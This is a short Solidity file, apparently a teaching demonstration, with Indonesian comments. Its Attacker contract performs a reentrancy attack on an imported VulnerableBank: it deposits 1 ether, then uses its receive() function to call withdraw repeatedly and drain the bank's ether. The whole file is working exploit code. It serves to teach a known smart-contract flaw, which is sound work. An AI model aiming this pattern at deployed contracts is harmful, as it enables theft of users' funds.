// SPDX-License-Identifier: MIT
pragma solidity ^0.8.37;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public bank;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    // Fungsi receive otomatis dipanggil saat menerima Ether
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            // Memanggil withdraw kembali sebelum saldo di bank di-reset ke 0
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 Ether");
        bank.deposit{value: 1 ether}();
        bank.withdraw(); // Memulai rantai serangan
    }
}
